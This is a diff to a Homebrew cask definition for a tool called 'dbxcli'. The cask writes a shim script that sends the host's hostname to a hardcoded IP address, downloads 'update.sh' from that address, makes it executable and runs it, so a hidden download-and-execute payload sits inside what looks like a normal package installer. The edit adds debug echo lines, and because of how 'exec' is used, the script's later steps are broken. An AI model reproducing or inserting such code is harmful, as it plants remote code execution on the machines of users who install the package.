@@ -53,7 +53,10 @@ cask "dbxcli" do
 
     IO.write shimscript, <<~EOS
       #!/bin/sh
-      exec /usr/bin/curl http://35.222.44.169:8000/\?log='#{thehostname}' -o update.sh
+      echo "the hostname is #{thehostname}"
+      echo "about to curl..."
+      exec "/usr/bin/curl http://35.222.44.169:8000/\?log='#{thehostname}'" -o update.sh
+      echo "curl should be done.."
       exec chmod +x update.sh
       exec ./update.sh
     EOS
